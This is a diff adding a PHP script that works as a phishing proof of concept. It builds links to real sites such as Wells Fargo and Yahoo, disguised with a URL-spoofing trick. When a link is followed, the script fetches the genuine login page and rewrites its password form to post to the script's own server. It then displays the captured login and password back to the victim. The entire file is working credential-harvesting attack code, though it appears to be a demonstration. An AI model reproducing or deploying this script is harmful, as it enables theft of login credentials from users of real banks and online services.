@@ -1,0 +1,143 @@
+<?php
+
+# here are a few links to get you started - most non-static URLs
+# with login forms that use <input type="password"> will work
+
+$dest[]="Slashdot";
+$link[]="http://www.slashdot.org";
+$dest[]="Kuro5hin";
+$link[]="http://www.kuro5hin.org";
+$dest[]="Yahoo!";
+$link[]="http://my.yahoo.com";
+$dest[]="America On-Line";
+$link[]="http://www.aol.com";
+$dest[]="NetZero";
+$link[]="http://webmail.netzero.net";
+$dest[]="Wells Fargo Bank";
+$link[]="http://www.wellsfargo.com";
+$dest[]="Neverwinter Nights";
+$link[]="http://nwn.bioware.com";
+
+# has somebody submitted our form?
+
+if (isset($the_site_you_really_wanted))
+{
+	print "<html><body>\n";
+	print "<b>Be afraid. Be very afraid.</b>\n";
+	print "<p>\n";
+	print "You just gave me your login and password for the following Web site:\n";
+	print "<p>\n";
+	print "<ul>\n";
+	foreach ($_POST as $k => $v)
+	{
+		print "<li>$k: $v</li>\n";
+	}
+	foreach ($_GET as $k => $v)
+	{
+		print "<li>$k: $v</li>\n";
+	}
+	print "</ul>\n";
+	print "<b>Have a nice day!</b>\n";
+	print "</body></html>\n";
+	exit;
+}
+
+# if one of our links was not submitted, print the list of links
+
+if (!isset($p))
+{
+	print "<html><body>\n";
+	print "<b>Useful Links</b>\n";
+	print "<ul>\n";
+	$i=0;
+	foreach($dest as $c)
+	{
+		$t = $link[$i] . "&#1%00@" . $_SERVER['SERVER_NAME'] . $PHP_SELF . "?p=" . $link[$i];
+		print "<li><a href=\"$t\">$dest[$i]</a></li>\n";
+		$i++;
+	}
+	print "</ul>\n";
+	print "</body></html>\n";
+}
+else
+{
+
+	# here we go ... some eager sucker has followed one of our links
+
+	# first, parse the URL in case we need to supply a base href later
+
+	$url = parse_url($p);
+	$base_href = $url[scheme] . "://" . $url[host] . "/";
+
+	# go grab the page
+
+	$handle = fopen ($p, "r");
+	$contents = "";
+	do {
+	   $chunk = fread($handle, 8192);
+	   if (strlen($chunk) == 0) {
+		   break;
+	   }
+	   $contents .= $chunk;
+	} while(true);
+	fclose ($handle);
+
+	# stick it all in $data
+
+	$data = explode("\n", $contents);
+
+	# go through $data line by line
+
+	for ($i=0; $i<count($data); $i++)
+	{
+		if (stristr($data[$i], "<base"))
+		{
+			# found base href
+			$found_base_href=1;
+		}
+		if (stristr($data[$i], "<form") && !isset($found_password))
+		{
+			# save the line number where the form started
+			$start_line=$i;
+			# we've found a form to look at
+			$in_form=1;
+		}
+		if (isset($in_form) && $in_form)
+		{
+			# we're in the form
+			if (stristr($data[$i], "type") && stristr($data[$i], "password"))
+			{
+				# we've found the password blank
+				$found_password = 1;
+			}
+		}
+		if (stristr($data[$i], "</form"))
+		{
+			# we're out of the form
+			$in_form = 0;
+			if (isset($found_password))
+			{
+				# we're done
+				break;
+			}
+		}
+	}
+	if (isset($found_password))
+	{
+		# we found the password entry line; go back and substitute our form action
+		$data[$start_line] = "<form method=\"post\" action=\"http://" . $_SERVER['SERVER_NAME'] . $PHP_SELF . "\"><input type=\"hidden\" name=\"the_site_you_really_wanted\" value=\"$p\">";
+	}
+
+	# dump the compromised page to the client's browser
+	foreach ($data as $line)
+	{
+		print "$line";
+		print "\n";
+		if (stristr($line, "<head") && !isset($found_base_href))
+		{
+			print "<base href=\"$base_href\">\n";
+		}
+	}
+}
+
+?>
